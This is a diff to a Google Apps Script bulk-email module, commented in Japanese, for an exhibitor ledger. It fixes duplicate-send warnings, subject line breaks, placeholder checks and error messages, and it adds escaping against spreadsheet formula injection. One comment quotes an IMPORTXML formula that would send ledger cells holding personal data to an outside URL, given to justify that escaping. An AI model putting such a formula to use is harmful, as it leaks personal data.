@@ -210,7 +210,7 @@ function broadcastRecent_(subject, ids) {
     if (s) want[s] = true;
   });
 
-  var empty = { ids: [], sentAt: '', sendId: '' };
+  var empty = { ids: [], sentAt: '', sendId: '', headBroken: false };
   var sh = broadcastSheetOrNull_();
   if (!sh || sh.getLastRow() < 2) return empty;
 
@@ -218,30 +218,64 @@ function broadcastRecent_(subject, ids) {
   var H = grid[0].map(function (h) { return String(h).trim(); });
   var iAt = H.indexOf('送信日時'), iSub = H.indexOf('件名');
   var iTo = H.indexOf('宛先の受付ID'), iId = H.indexOf('送信ID');
-  if (iAt < 0 || iSub < 0 || iTo < 0) return empty;
+  if (iAt < 0 || iSub < 0 || iTo < 0) {
+    // **黙って「重なりなし」と答えない。**
+    // 人がシートの列名を短くしただけで警告が死んでいた（2026-09-08 の検証で発見）
+    return { ids: [], sentAt: '', sendId: '', headBroken: true };
+  }
 
   var now = new Date().getTime();
-  var subj = String(subject == null ? '' : subject).trim();
+  var subj = broadcastPlainText_(subject);
 
-  // 新しいほうから見て、最初に当たったものを返す
+  /*
+   * ■ 最初に当たった1行で打ち切らない
+   *
+   *   一度に送れるのは40社なので、50社の催促は**必ず2回に分かれる**。
+   *   1行で return していたため、そのあと全社を選び直すと
+   *   後半のバッチしか報せず、**前半40社に無警告で2通目**が届いていた
+   *   （2026-09-08 の検証で発見）。24時間の窓に入る行を全部見る。
+   */
+  var seen = Object.create(null);
+  var hits = [];
+  var sentAt = '', sendId = '', newest = -1;
+
   for (var i = grid.length - 1; i >= 1; i--) {
     var r = grid[i];
-    if (String(r[iSub] == null ? '' : r[iSub]).trim() !== subj) continue;
+    if (broadcastPlainText_(r[iSub]) !== subj) continue;
     var at = broadcastParseAt_(r[iAt]);
     if (!isFinite(at) || now - at > BROADCAST_WINDOW_MS || at > now) continue;
 
-    var hit = String(r[iTo] == null ? '' : r[iTo]).split(',')
-      .map(function (s) { return s.trim(); })
-      .filter(function (s) { return s && want[s]; });
-    if (!hit.length) continue;
+    var any = false;
+    String(r[iTo] == null ? '' : r[iTo]).split(',').forEach(function (s) {
+      var id = s.trim();
+      if (!id || !want[id] || seen[id]) return;
+      seen[id] = true;
+      hits.push(id);
+      any = true;
+    });
+    if (!any) continue;
 
-    return {
-      ids: hit,
-      sentAt: asText_(r[iAt]),
-      sendId: iId < 0 ? '' : String(r[iId] == null ? '' : r[iId]).trim(),
-    };
+    // 日時は**いちばん新しい行**のものを出す（「さっき送ったやつだ」と分かるように）
+    if (at > newest) {
+      newest = at;
+      sentAt = asText_(r[iAt]);
+      sendId = iId < 0 ? '' : String(r[iId] == null ? '' : r[iId]).trim();
+    }
   }
-  return empty;
+  return { ids: hits, sentAt: sentAt, sendId: sendId, headBroken: false };
+}
+
+/**
+ * シートの値を、比べられる素の文字列にする。
+ *
+ * `safeCellText_` は数式として動く値の頭に `'` を足す。本物のスプレッドシートは
+ * それを表示上の印として扱い `getValues()` では返さないが、**返す実装もありうる**。
+ * どちらでも件名の照合が一致するように、先頭の `'` を落としてから比べる。
+ * ここがずれると、二重送信の警告が**黙って**効かなくなる。
+ */
+function broadcastPlainText_(v) {
+  var s = String(v == null ? '' : v).trim();
+  return s.charAt(0) === "'" ? s.slice(1) : s;
 }
 
 /**
@@ -254,6 +288,19 @@ var BROADCAST_BLOCKED_STATUS = ['辞退', 'キャンセル', '重複（無効）
 
 /** 宛先の形。採択通知（gas/Notify.gs）と同じ判定にそろえる */
 var BROADCAST_EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+/**
+ * 件名の中の改行。**LF だけでなく CR も潰す。**
+ *
+ * LF しか見ていなかったので、CR が残ると件名が化けた（2026-09-08 の検証で指摘）。
+ *
+ * ⚠ この定数を消して呼び出し側に正規表現を直書きしないこと。
+ *   `\r` `\n` は、編集の経路によっては**1文字の制御文字に化ける**。
+ *   実際、この行を書き足したときに化けて、正規表現が途中で改行され
+ *   `SyntaxError: Invalid regular expression` になった（引き継ぎ書 §8）。
+ */
+var SUBJECT_BREAK_RE = new RegExp('[' + String.fromCharCode(13)
+                                      + String.fromCharCode(10) + ']+', 'g');
 
 /** 割当開始区画と区画数から「12〜14」を作る。1区画なら範囲にしない */
 function broadcastBlock_(start, units) {
@@ -419,28 +466,42 @@ function broadcastValidate_(subject, body) {
   }
 
   var names = broadcastVarNames_();
-  var text = subject + String.fromCharCode(10) + body;
 
-  // 知らない差し込み。**置き換わらないまま、そのまま届く**
+  /*
+   * ⚠ **件名と本文は、別々に検査する。**
+   *
+   *   以前はつないで1つの文字列にしていたので、
+   *   件名 `件名 {{` ＋ 本文 `お名前}} 様` が「正しい形」に見えて通っていた
+   *   （2026-09-08、検証役が発見）。送るときは件名と本文を別々に
+   *   組み立てるので、**どちらにも `{{` が生のまま残って届く**。
+   */
   var unknown = [];
-  var re = /\{\{([^{}]{1,40})\}\}/g;
-  var m;
-  while ((m = re.exec(text)) !== null) {
-    var name = String(m[1]).trim();
-    if (names.indexOf(name) >= 0) continue;
-    if (unknown.indexOf(name) < 0) unknown.push(name);
-  }
+  var loose = false;
+
+  [subject, body].forEach(function (text) {
+    // 知らない差し込み。**置き換わらないまま、そのまま届く**
+    var re = /\{\{([^{}]{1,40})\}\}/g;
+    var m;
+    while ((m = re.exec(text)) !== null) {
+      var name = String(m[1]).trim();
+      if (names.indexOf(name) >= 0) continue;
+      if (unknown.indexOf(name) < 0) unknown.push(name);
+    }
+    // 括弧の閉じ忘れ・余り。**正しい形を全部取り除いてから**残りを見る。
+    // 「知らない差し込み」の検査は正しい形しか見ないので、ここは別に要る。
+    // `{{お名前}}}` の余った `}` も、そのまま届く（「中村 美咲} 様」）ので断る
+    var rest = text.replace(/\{\{[^{}]{1,40}\}\}/g, '');
+    if (rest.indexOf('{') >= 0 || rest.indexOf('}') >= 0) loose = true;
+  });
+
   if (unknown.length) {
     errs.push('一斉メールで使えない差し込みがあります：{{' + unknown.join('}} {{')
       + '}}　（使えるのは ' + names.join('・') + ' です）');
   }
-
-  // 括弧の閉じ忘れ。**正しい形を全部取り除いてから**残りを見る。
-  // 「知らない差し込み」の検査は正しい形しか見ないので、ここは別に要る
-  var rest = text.replace(/\{\{[^{}]{1,40}\}\}/g, '');
-  if (rest.indexOf('{{') >= 0 || rest.indexOf('}}') >= 0) {
-    errs.push('差し込みの括弧が閉じていないところがあります。'
-      + '{{お名前}} のように、二重の波括弧で挟んでください。');
+  if (loose) {
+    errs.push('差し込みの括弧が正しく閉じていないところがあります。'
+      + '{{お名前}} のように、二重の波括弧でちょうど挟んでください。'
+      + '（件名と本文にまたがって書くこともできません）');
   }
 
   return errs;
@@ -477,7 +538,8 @@ function broadcastBuild_(row, subject, body) {
 
   return {
     subject: mailtplRender_(String(subject == null ? '' : subject), vars)
-      .split(String.fromCharCode(10)).join(' ').trim(),
+      // 改行は LF も CR も潰す。CR が残ると件名が化ける
+      .split(SUBJECT_BREAK_RE).join(' ').trim(),
     body: mailtplRender_(String(body == null ? '' : body), vars),
     dropped: dropped,
   };
@@ -521,14 +583,29 @@ function broadcastSendId_(sh, now) {
  * @returns {number} 書いた行番号（結果を後から埋めるのに使う）
  */
 function broadcastLog_(sh, sendId, now, person, subject, body, ids) {
+  /*
+   * ⚠ **`safeCellText_` を必ず通す。**
+   *
+   *   `gas/Ledger.gs` の `appendHistory` は「呼び出し側を全部直すより、
+   *   書き込む側で1回止めるほうが確実」として同じことをしている。
+   *   このシートだけ素通しにしていて、検証役2体に指摘された（2026-09-08）。
+   *
+   *   直接の害：件名に `=IMPORTXML("https://…"&A2,"//a")` と書くと、
+   *   台帳の他のセル（個人情報）を外部URLに載せられる。
+   *
+   *   **より確実に起きる二次被害**：数式になったセルは `getValues()` が
+   *   **計算結果**を返すので、`broadcastRecent_` の件名照合が一致しなくなり、
+   *   24時間の二重送信警告が**黙って死ぬ**。
+   *   引き金は「本文の先頭に `-` を書く」（箇条書き）だけで足りる。
+   */
   sh.appendRow([
-    sendId,
+    safeCellText_(sendId),
     Utilities.formatDate(now, 'Asia/Tokyo', 'yyyy-MM-dd HH:mm'),
-    String(person == null ? '' : person),
-    String(subject == null ? '' : subject),
-    String(body == null ? '' : body),
+    safeCellText_(person == null ? '' : person),
+    safeCellText_(subject == null ? '' : subject),
+    safeCellText_(body == null ? '' : body),
     ids.length,
-    ids.join(','),
+    safeCellText_(ids.join(',')),
     '送信中',
   ]);
   return sh.getLastRow();
@@ -537,7 +614,7 @@ function broadcastLog_(sh, sendId, now, person, subject, body, ids) {
 /** 送り終えてから、結果の列だけを埋める */
 function broadcastLogResult_(sh, rowNo, text) {
   var col = BROADCAST_HEAD.indexOf('結果') + 1;
-  if (col > 0 && rowNo > 0) sh.getRange(rowNo, col).setValue(text);
+  if (col > 0 && rowNo > 0) sh.getRange(rowNo, col).setValue(safeCellText_(text));
 }
 
 // ─────────────────────────────── 画面から呼ばれる2つ
@@ -625,7 +702,8 @@ function adminBroadcastPreview_(auth, payload) {
     // 差出人の設定が壊れていると、事業者に別のアドレスから届く。送る前に見せる
     mail: diagnoseMail(),
     // 文面に問題があるうち、履歴シートが無いうちは札を出さない（どのみち送れない）
-    ticket: (errors.length || !historyReady)
+    ticket: (errors.length || !historyReady || sendIds.length > BROADCAST_BATCH_MAX
+             || !sendIds.length)
       ? '' : broadcastTicket_(subject, body, sendIds),
   };
 }
@@ -667,14 +745,24 @@ function adminBroadcastSend_(auth, payload) {
    */
   var sh = broadcastSheetOrNull_();
   if (!sh) {
+    // ⚠ `setup()` は営業担当には実行できない。**実行できない指示は、指示ではない**
+    //   （2026-09-08 の検証で指摘）。人が取れる次の一手を先に書く
     return { ok: false, error: 'no_sheet',
-      message: '台帳に「一斉メール履歴」シートがありません。'
-             + 'Apps Script から setup() を1回実行してください。'
-             + '（送った記録が残せないため、1通も送っていません）' };
+      message: '台帳の準備ができていないため、いまは送信できません'
+             + '（送った記録が残せないため、1通も送っていません）。'
+             + '事務局にご連絡ください（連絡先は「設定」タブの'
+             + '「事務局の連絡先」に出ています）。'
+             + '「一斉メールの準備をお願いします」とお伝えいただければ通じます。'
+             + '　［技術メモ：台帳の Apps Script から setup() を1回実行してください］' };
   }
 
   var lock = LockService.getScriptLock();
-  if (!lock.tryLock(LOCK_WAIT_MS)) return { ok: false, error: 'busy' };
+  if (!lock.tryLock(LOCK_WAIT_MS)) {
+    return { ok: false, error: 'busy',
+      message: 'ほかの操作が進行中です。少し待ってから、'
+             + 'もう一度「本文を確認する」を押してお試しください。'
+             + '（この時点では1通も送っていません）' };
+  }
 
   try {
     var L = readLedger_();
@@ -691,8 +779,10 @@ function adminBroadcastSend_(auth, payload) {
     picked.invalid.forEach(function (r) { lost.push(r.id + '（宛先）'); });
     if (lost.length) {
       return { ok: false, error: 'changed',
-        message: 'プレビューのあとに、対象が変わりました。'
-               + 'もう一度プレビューをやり直してください。（変わった：'
+        // ⚠ 画面に「プレビュー」というボタンは無い。あるのは「本文を確認する」。
+        //   使う人が探せない言葉を、エラー文に書かないこと（2026-09-08 の検証で指摘）
+        message: '「本文を確認する」を押したあとに、送る相手が変わりました。'
+               + 'もう一度「本文を確認する」を押してください。（変わった：'
                + lost.join('、') + '）' };
     }
     if (!picked.rows.length) {
@@ -704,23 +794,33 @@ function adminBroadcastSend_(auth, payload) {
                + picked.rows.length + '件）。分けてお送りください。' };
     }
 
-    // ■ 札を使う。**一度きり**
-    //   ここまでの検査を通ってから消費する（台帳が変わっていただけなら、
-    //   札を無駄にせずプレビューし直せる）
     var sendIds = picked.rows.map(function (r) { return r.id; });
-    if (!broadcastUseTicket_(payload.ticket, subject, body, sendIds)) {
-      return { ok: false, error: 'stale',
-        message: 'この内容は、プレビューで確認したものと違います'
-               + '（または、すでに送信済みです）。'
-               + 'もう一度プレビューをやり直してください。' };
-    }
 
-    // 送る前に残量を確かめる。途中で尽きると、半分だけ届いた状態になる
+    /*
+     * 送る前に残量を確かめる。途中で尽きると、半分だけ届いた状態になる。
+     *
+     * **札を消費する前に見る。** あとに置いていたので、残量が足りないだけで
+     * 札まで失い、プレビューからやり直しになっていた（2026-09-08 の検証で指摘）。
+     */
     var quota = MailApp.getRemainingDailyQuota();
     if (quota < sendIds.length) {
       return { ok: false, error: 'quota',
         message: '本日の送信可能数が足りません（残り' + quota + '通／対象'
-               + sendIds.length + '件）。明日あらためてお試しください。' };
+               + sendIds.length + '件）。'
+               + (quota > 0
+                   ? '出店者一覧で ' + quota + '社までに絞ってお送りいただくか、'
+                     + '明日あらためてお試しください。'
+                   : '明日あらためてお試しください。') };
+    }
+
+    // ■ 札を使う。**一度きり**
+    //   ここまでの検査を全部通ってから消費する（台帳が変わっていた・
+    //   残量が足りなかっただけなら、札を無駄にせずやり直せる）
+    if (!broadcastUseTicket_(payload.ticket, subject, body, sendIds)) {
+      return { ok: false, error: 'stale',
+        message: 'この内容は、直前に「本文を確認する」で見たものと違います'
+               + '（または、すでに送信済みです）。'
+               + 'もう一度「本文を確認する」を押してください。' };
     }
 
     // ■ 記録してから送る（gas/Notify.gs とは逆。broadcastLog_ の説明を参照）
@@ -746,14 +846,32 @@ function adminBroadcastSend_(auth, payload) {
       }
     });
 
-    broadcastLogResult_(sh, logRow,
-      '成功' + sent.length + '件'
-      + (failed.length ? ' / 失敗' + failed.length + '件：'
-          + failed.map(function (f) { return f.id; }).join(',') : ''));
+    /*
+     * ■ ここから先で失敗しても、「送信できませんでした」とは言わない
+     *
+     *   メールはもう届いている。ここで例外を投げると `gas/Api.gs` が
+     *   **文言なしの server_error** に潰し、画面には「送信できませんでした」
+     *   だけが出る。押した人は届いていないと思って**もう一度送る**
+     *   （2026-09-08 の検証で指摘）。
+     *
+     *   記録が残らなかったことは、送れたことと**分けて**伝える。
+     */
+    var bookkeeping = '';
+    try {
+      broadcastLogResult_(sh, logRow,
+        '成功' + sent.length + '件'
+        + (failed.length ? ' / 失敗' + failed.length + '件：'
+            + failed.map(function (f) { return f.id; }).join(',') : ''));
 
-    // 変更履歴は**送信ごとに1行**。1通ごとだと50行増えて履歴が埋まる
-    appendHistory(auth && auth.person, '', '一斉メール', '',
-      subject + '（' + sent.length + '件）', sendId);
+      // 変更履歴は**送信ごとに1行**。1通ごとだと50行増えて履歴が埋まる
+      appendHistory(auth && auth.person, '', '一斉メール', '',
+        subject + '（' + sent.length + '件）', sendId);
+    } catch (e) {
+      logError_('adminBroadcastSend_:記録', e);
+      bookkeeping = '　※ 送信は完了しましたが、記録の書き込みに失敗しました（'
+        + String((e && e.message) || e).slice(0, 120) + '）。'
+        + '送信ID ' + sendId + ' で「一斉メール履歴」シートをご確認ください。';
+    }
 
     return {
       ok: true,
@@ -761,7 +879,9 @@ function adminBroadcastSend_(auth, payload) {
       sent: sent,
       failed: failed,
       message: sent.length + '件を送信しました。'
-        + (failed.length ? '（' + failed.length + '件が失敗しています）' : ''),
+        + (failed.length ? '（' + failed.length + '件が失敗しています）' : '')
+        + bookkeeping,
+      bookkeeping: bookkeeping,
     };
   } finally {
     lock.releaseLock();
